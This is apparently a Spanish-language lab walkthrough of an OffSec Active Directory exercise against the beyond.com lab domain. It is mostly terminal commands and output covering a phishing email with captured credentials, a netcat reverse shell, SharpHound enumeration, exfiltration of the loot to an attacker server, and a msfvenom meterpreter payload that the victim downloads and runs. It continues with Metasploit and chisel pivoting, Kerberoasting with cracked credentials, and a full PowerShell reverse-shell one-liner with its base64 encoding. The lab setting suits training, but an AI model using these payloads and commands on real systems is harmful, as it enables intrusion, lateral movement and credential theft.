┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
└─# swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.234.242 --body @mail.txt --header "Subject: Staging Script" --suppress-data -ap                                       
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.234.242:25...
=== Connected to 192.168.234.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO localhost
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 43 lines sent
<-  250 Queued (13.236 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
└─# nc -lvnp 4444                                                                                                            
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.234.242] 64753
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus
PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1
PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.190.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.190.254
PS C:\Windows\System32\WindowsPowerShell\v1.0> 

# Ejecutamos winPEAS.exe

����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:86:24:D8]: 172.16.190.243 / 255.255.255.0
        Gateways: 172.16.190.254
        DNSs: 172.16.190.240
        Known hosts:
          172.16.190.240        00-50-56-86-0F-C9     Dynamic
          172.16.190.254        00-50-56-86-E8-00     Dynamic
          172.16.190.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static

# Ejecutamos SharpHound:
PS C:\Users\marcus> . .\SharpHound.ps1
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\marcus\"                  
Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\marcus\"                                                                                                                                       
2025-06-22T16:00:17.3434320-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound                                                                                       
2025-06-22T16:00:17.4996980-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote              
2025-06-22T16:00:17.5153175-07:00|INFORMATION|Initializing SharpHound at 4:00 PM on 6/22/2025                                                                                                                     
2025-06-22T16:00:17.7965438-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for beyond.com : DCSRV1.beyond.com                                                                              
2025-06-22T16:00:17.8434188-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote                                    
2025-06-22T16:00:17.9684417-07:00|INFORMATION|Beginning LDAP search for beyond.com                                                                                                                                
2025-06-22T16:00:17.9840320-07:00|INFORMATION|Producer has finished, closing LDAP channel                                                                                                                         
2025-06-22T16:00:17.9996593-07:00|INFORMATION|LDAP channel closed, waiting for consumers                                                                                                                          
2025-06-22T16:00:48.1706955-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 97 MB RAM                                                                                                              
2025-06-22T16:00:58.9357580-07:00|INFORMATION|Consumers finished, closing output channel                                                                                                                          
2025-06-22T16:00:58.9670107-07:00|INFORMATION|Output channel closed, waiting for output task to complete                                                                                                          
Closing writers                                                                                                                                                                                                   
2025-06-22T16:00:59.0607540-07:00|INFORMATION|Status: 97 objects finished (+97 2.365854)/s -- Using 103 MB RAM                                                                                                    
2025-06-22T16:00:59.0607540-07:00|INFORMATION|Enumeration finished in 00:00:41.1014832                                                                                                                            
2025-06-22T16:00:59.1232558-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.                                                                                                                    
 57 name to SID mappings.                                                                                                                                                                                         
 1 machine sid mappings.                                                                                                                                                                                          
 2 sid to domain mappings.                                                                                                                                                                                        
 0 global catalog mappings.                                                                                                                                                                                       
2025-06-22T16:00:59.1388873-07:00|INFORMATION|SharpHound Enumeration Completed at 4:00 PM on 6/22/2025! Happy Graphing!                                                                                           
PS C:\Users\marcus> 

# Looteo del .zip

┌──(root㉿kali)-[/home/kali/Scripts/05_Utils/loot_server]
└─# python3 loot_server.py     
Listening on port 8000 for uploads...
192.168.209.242 - - [22/Jun/2025 20:20:49] "POST / HTTP/1.1" 200 -

PS C:\Users\marcus> iwr -uri http://192.168.45.213:8000/Send-FileToLootSerer.ps1 -Outfile looter.ps1
iwr -uri http://192.168.45.213:8000/Send-FileToLootSerer.ps1 -Outfile looter.ps1
PS C:\Users\marcus> dir
dir


    Directory: C:\Users\marcus


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---         9/29/2022   1:49 AM                Contacts                                                             
d-r---         9/29/2022   1:49 AM                Desktop                                                              
d-r---         9/29/2022   4:37 AM                Documents                                                            
d-r---         9/29/2022   4:33 AM                Downloads                                                            
d-r---         9/29/2022   1:49 AM                Favorites                                                            
d-r---         9/29/2022   1:49 AM                Links                                                                
d-r---         9/29/2022   1:49 AM                Music                                                                
d-r---         9/29/2022   1:50 AM                OneDrive                                                             
d-r---         9/29/2022   1:50 AM                Pictures                                                             
d-r---         9/29/2022   1:49 AM                Saved Games                                                          
d-r---         9/29/2022   1:50 AM                Searches                                                             
d-r---         9/29/2022   4:30 AM                Videos                                                               
-a----         6/22/2025   4:00 PM          11850 20250622160058_BloodHound.zip                                        
-a----         6/22/2025   4:18 PM           1218 looter.ps1                                                           
-a----         6/22/2025   8:55 AM        1308348 SharpHound.ps1                                                       
-a----         6/22/2025   4:00 PM           8557 Zjc5OGNlNTktMzQ0Ni00YThkLWEzZjEtNWNhZGJlNzdmODZl.bin                 


PS C:\Users\marcus> .\looter.ps1 -FilePath "C:\Users\marcus\20250622160058_BloodHound.zip" -URL "http://192.168.45.213:8000"
.\looter.ps1 -FilePath "C:\Users\marcus\20250622160058_BloodHound.zip" -URL "http://192.168.45.213:8000"


StatusCode        : 200
StatusDescription : OK
Content           : {70, 105, 108, 101...}
RawContent        : HTTP/1.0 200 OK
                    Date: Sun, 22 Jun 2025 23:20:49 GMT
                    Server: BaseHTTP/0.6 Python/3.13.2
                    
                    File received.
Headers           : {[Date, Sun, 22 Jun 2025 23:20:49 GMT], [Server, BaseHTTP/0.6 Python/3.13.2]}
RawContentLength  : 14

Archivo enviado exitosamente: 20250622160058_BloodHound.zip
```

#### Revisamos archivo .zip en BloodHound:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/CLIENTWK1]
└─# mv /tmp/20250622160058_BloodHound.zip .
                                                                                                       
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/CLIENTWK1]
└─# ll     
total 12
-rw-r--r-- 1 root root 11850 Jun 22 20:20 20250622160058_BloodHound.zip
                                                                                                       
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/CLIENTWK1]
└─# unzip 20250622160058_BloodHound.zip -d clientwk1_bloodHound                             
Archive:  20250622160058_BloodHound.zip
  inflating: clientwk1_bloodHound/20250622160058_computers.json  
  inflating: clientwk1_bloodHound/20250622160058_users.json  
  inflating: clientwk1_bloodHound/20250622160058_groups.json  
  inflating: clientwk1_bloodHound/20250622160058_containers.json  
  inflating: clientwk1_bloodHound/20250622160058_domains.json  
  inflating: clientwk1_bloodHound/20250622160058_gpos.json  
  inflating: clientwk1_bloodHound/20250622160058_ous.json  

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
└─# neo4j console                                                                                                                                
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2025-06-22 23:37:50.649+0000 INFO  Starting...
2025-06-22 23:37:51.928+0000 INFO  This instance is ServerId{314dfaa4} (314dfaa4-208b-460b-be06-b478ecaac179)
2025-06-22 23:37:55.134+0000 INFO  ======== Neo4j 4.4.26 ========
2025-06-22 23:37:57.813+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2025-06-22 23:37:57.813+0000 INFO  Updating the initial password in component 'security-users'
2025-06-22 23:38:00.215+0000 INFO  Bolt enabled on localhost:7687.
2025-06-22 23:38:02.314+0000 INFO  Remote interface available at http://localhost:7474/
2025-06-22 23:38:02.323+0000 INFO  id: 6E609F2ACAD00EBB958BE98FA03FC7D10AC2C3AC78BF48E2F8A88586CC045C3B
2025-06-22 23:38:02.324+0000 INFO  name: system
2025-06-22 23:38:02.324+0000 INFO  creationDate: 2025-04-18T14:40:04.27Z
2025-06-22 23:38:02.325+0000 INFO  Started.                                                                                                       
```

#### Obtenemos IP de INTERNALSRV1.BEYOND.COM

```powershell
PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
nslookup INTERNALSRV1.BEYOND.COM
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.145.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.145.241
```
#### Enumeracion con Bloodhound:

* Querys utilizadas
```bash


```
#### Configuracion pivote MSF

1. **msfvenom**
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.213 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
```
2. **CLIENTWK1**

```powerview
PS C:\Users\marcus> iwr -uri http://192.168.45.213:8000/met.exe -Outfile met.e
iwr -uri http://192.168.45.213:8000/met.exe -Outfile met.exe
PS C:\Users\marcus> Start-Process .\met.exe
.\met.exe
PS C:\Users\marcus> 
```

3. **MFSconsole**

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.213
LHOST => 192.168.45.213
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.213:443 
[*] Sending stage (203846 bytes) to 192.168.189.242
[*] Meterpreter session 1 opened (192.168.45.213:443 -> 192.168.189.242:64516) at 2025-06-23 20:04:38 -0300
whoami
background
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                Connection
  --  ----  ----                     -----------                ----------
  1         meterpreter x64/windows  BEYOND\marcus @ CLIENTWK1  192.168.45.213:443 -> 192.168.189.242:64516 (192.168.189.242)

msf6 exploit(multi/handler) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
session => 1
msf6 post(multi/manage/autoroute) > run
[*] Running module against CLIENTWK1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.145.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server
```

#### Enumeramos la red-interna

1. **SMB**

```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
└─# proxychains -q crackmapexec smb 172.16.145.240-241 172.16.145.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
SMB         172.16.145.240  445    DCSRV1           [*] Windows Server 2022 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB         172.16.145.241  445    INTERNALSRV1     [*] Windows Server 2022 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.145.254  445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.145.240  445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.145.241  445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.145.241  445    INTERNALSRV1     [+] Enumerated shares
SMB         172.16.145.241  445    INTERNALSRV1     Share           Permissions     Remark
SMB         172.16.145.241  445    INTERNALSRV1     -----           -----------     ------
SMB         172.16.145.241  445    INTERNALSRV1     ADMIN$                          Remote Admin
SMB         172.16.145.241  445    INTERNALSRV1     C$                              Default share
SMB         172.16.145.241  445    INTERNALSRV1     IPC$            READ            Remote IPC
SMB         172.16.145.254  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.145.240  445    DCSRV1           [+] Enumerated shares
SMB         172.16.145.240  445    DCSRV1           Share           Permissions     Remark
SMB         172.16.145.240  445    DCSRV1           -----           -----------     ------
SMB         172.16.145.240  445    DCSRV1           ADMIN$                          Remote Admin
SMB         172.16.145.240  445    DCSRV1           C$                              Default share
SMB         172.16.145.240  445    DCSRV1           IPC$            READ            Remote IPC
SMB         172.16.145.240  445    DCSRV1           NETLOGON        READ            Logon server share 
SMB         172.16.145.240  445    DCSRV1           SYSVOL          READ            Logon server share 
SMB         172.16.145.254  445    MAILSRV1         [+] Enumerated shares
SMB         172.16.145.254  445    MAILSRV1         Share           Permissions     Remark
SMB         172.16.145.254  445    MAILSRV1         -----           -----------     ------
SMB         172.16.145.254  445    MAILSRV1         ADMIN$                          Remote Admin
SMB         172.16.145.254  445    MAILSRV1         C$                              Default share
SMB         172.16.145.254  445    MAILSRV1         IPC$            READ            Remote IPC
```
2. **Servicios**

```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
└─# proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.145.240 172.16.145.241 172.16.145.254
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 21:30 -03
Nmap scan report for 172.16.145.240
Host is up (2.4s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  closed http
443/tcp closed https

Nmap scan report for 172.16.145.241
Host is up (1.9s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp open   https

Nmap scan report for 172.16.145.254
Host is up (2.1s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp closed https

Nmap done: 3 IP addresses (3 hosts up) scanned in 21.95 seconds
```
### 27.5. Ataque a una aplicación web interna

#### chisel:

1. Server
```bash
┌──(root㉿kali)-[/home/kali]
└─# chisel server -p 8080 --reverse
2025/06/23 21:59:53 server: Reverse tunnelling enabled
2025/06/23 21:59:53 server: Fingerprint QKGaUWe4lYgs7w/nZ4gQW+nxlw2wh5EQ5VUlvRca5gM=
2025/06/23 21:59:53 server: Listening on http://0.0.0.0:9999
2025/06/23 22:13:16 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2025/06/23 22:13:16 server: session#1: tun: proxy#R:80=>172.16.145.241:80: Listening
```

2. Client
 
```powershell
PS C:\users\marcus> Start-Process .\chisel.exe -ArgumentList "client 192.168.45.213:8080 R:80:172.16.xxx.241:80"
Start-Process .\chisel.exe -ArgumentList "client 192.168.45.213:8080 R:1080:socks"
```

3. Obtenemos el TGS a traves de SPNs

```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
└─# proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.151.240 beyond.com/john                         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delega
----------------------------  -------  --------  --------------------------  --------------------------  ------
http/internalsrv1.beyond.com  daniela            2022-09-29 05:17:20.062328  2022-10-05 04:59:48.376728        

[-] CCache file is not found. Skipping...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$ff464c6c31502b025a8d9e48ef733ab5$36c3a818ac8f19d713e9f0fa043a40716cbfa86216ee5c656670be15bc1acb44461c321d55d3f50b59b9baf897c33415d3fc475f3c14af65fd3db14c4203215b69ed679de5fa32a6855b849b34d43f779c663e8822c03a1bb0f6e29f6976ac92572ecbeb36d7b4eb8f07dc6a1135a5776955f93e0c67f5e02df589cc2ecf6f169739e155ac79cf1c493aa490259a9bc4e0bde9cb51952b983dff71caaf2ded9d7099d2cbd54c4f0aca9b1debad10fd23a864d841c5810a6e8d9c33759da9811c56867276e750a34eeebf102b3385b3401b0528e57249286c3e44ee463ad5f58a17fa545a9be60430652a9f344258ca65dc9eeb7528d70b5bed20a5aa1cffb2ee2c1b9cce97e80f9d5f1e3ed1bb6d935b86a65ef679184a8a3c1ff836b955034c66ca227756acf03a06792f256ae593dfc9d7e1870882a2fdf9c3fb9f7152bf81acc9ec70c1282e7ea6784282a3a730393509bcb60f8b879fffbdede5400c087343ce2e2ddb24cd4e2e43721fe31714569748fde80adf0823d8d73b4d502954b5653e4fe94ffced7a7bb50e12376b9064e335de282d6dcec90b4cf18f12c483e5b14cd17785693f98e7acc531c6132776f239fa539ea9e1cae112d345266f38ba1363423f1973511ad911f9ebb808e967c275b61b27c201e3033f9776bebf3df22b6d8f1a120b4ee79029d3b60cf6d00b33e2044cadd9d94da1a1403c25ea14a383d28dfba0526bac648434a495a027b31e5d1ff279877dfc0162b136d5e038eb51077090fdae0ff6fad6dd911766b2724fdc0ab013507f41d9d6af22eb69f4b0e89cb613deaecb26a7bdf41ddf35b557a3ace0cd8b5bd07b519286648a0df558a7fef0126ea4f8604bb916f13c4dc811cdcf2e7164504559cf52c9f239d30eba66906d6cd0ae3e6a4cf72b40dfb4646391d741014bd220dca083f6ef4726ce7b41ceec4d5a8ea91791fd7f0971493880d09193c8b671fbc04699c48623f59d38ef390174a139a87a8c6bb1e42387a81708f630509c8bef1fc06d166
```

4. Guardamos el hash y lo crackeamos:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
└─# hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 14879/29823 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$726f7d21ca918c38645b1c967177d360$98a5bbaf85b3a3289c9caa427ed2c41dc2dc5ad2618a195b3bd22f66ca45174835105fb70010ce47ce288f52c9ef1cea05ba2dc1d3960a4077fe6d429e80257fcf0d322c2291090923ec0f0ed460bc626befdced9af20075cf4447a3b8d13e2909514a41507cfd8dc896e3ef3a2e7b99135519ac9c569b5ff02e3a24f8916da433eb279257a493c8c8e21bed47cecc25e26ff5197cf3b34a5705adca8b192668966a96b478f9f05230cc13802a627b39e812be74c2b16942b01afeba1d266bf29c2d8dcdb36577b1c9cd13115b7af361000717f20c7300daf0a31b3e71c16933b67ea573b51dc901758515ace1b08f21ea2fe5e224da7882c4bb15934485064bd6549bc06f6c8c577e0fafda73d4887fdff1a8e93fd14f87c44a015e2fbdd967b8b96de870bbb6a9d10585c2ddba37d55535a358cced5eb83d157a538c0b09fd4878c7d9c4011b8c9a21da776325fcf5bceed7b81bebec67e6afe521b6860c4a743e2684241417b741a026c42e6c47333b1414c4cf44f7ac1c2a3cf9eda17cb104f2855c1d9d127902a2ae9671b8ae2c6e4624509455428277a54ce3207e8ee05d8b94061ee14e1788428fcd70603da673e97384ee293d177294517bbdc2b5b1ee42ff0998847b144c2a9e77ccc107199c04553e53dba0d202d1b9b38cde4385c65399fc6db69d8b77e34d75766d9c104e180aaf29db9ccdc14689dc42819343ba0f1d2158ad007c7d39cd08293f3a459d701757f48aad997ae2472c6054dcbb63b18f8d47e145d83c6b460d4a6d8f072ccf1c9724c9724873dfc8586b2857c1bdd4f3367f73c1aa5998dbb365ad42435d28e129b2891cfd4ce166fbd28b29ebd42d4034818891bde141e62dd7666b2b33ee260a9f803291cceb788be3185faf7e58473e046f8ffa54310302b3ab70e43f1dde0b1b1a1b92735a234d5698b366aa7133720d180e6c7c74f2fdedf17cdae05900b0e015e2970f13e0d192e02289e8bf0d5384c6b03c8395bc15bbb55ca43ac34037b337e717a0e860f10ea78230ea93acb713bc2bd8395fe3009907dece4bbd875c61607b8f8b436eba66c5f52add2dd4c33cd1907fa032b2bce069ceee2f4652e49b4473856a2b9c93942f8a0802f9ac5dcd79eae99fe2363df3ddd61c20f386f47bf0466982f9e90311a0487f7d415d22f65f7df38293fae2d894753a23c2137471ecf8b66950f54f52f73192d326631b5a8df2de1b4d6c2f812fa52b2f70a0c8a2758869d17d86b66b3c8b32653d6648ba8cef8fad52c0ec26f72f800e390b7674f6b0448237772bbb1d6c2cbca0d694281715ef20bf3c2fa4ecef7246c517f771f796b2c7439584d4a766:DANIelaRO123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*...d4a766
Time.Started.....: Wed Jun 25 11:34:18 2025, (15 secs)
Time.Estimated...: Wed Jun 25 11:34:33 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   751.4 kH/s (8.42ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11272192/14344385 (78.58%)
Rejected.........: 0/11272192 (0.00%)
Restore.Point....: 11264000/14344385 (78.53%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: DEANNA5 -> DALDRICK16
Hardware.Mon.#1..: Temp: 53c Util: 85%

Started: Wed Jun 25 11:34:16 2025
Stopped: Wed Jun 25 11:34:35 2025
```
> Obtenemos la credencial del sitio wordpres **DANIelaRO123**

* Con el domino agregado en nuestro /etc/hosts 127.0.0.1 internalsrv1.beyond.com navegamos a **http://internalsrv1.beyond.com/wordpress/wp-admin/** e iniciamos sesion como **daniela**

- Ejecucion de vector 1:
1. payload.ps1 nano payload.ps1
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
2. Codificacion a base64:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/MAILSRV1]
└─# iconv -f utf-8 -t utf-16le payload.ps1 | base64 -w0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQAKAA==
```
3. Ejecutamos impacket:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
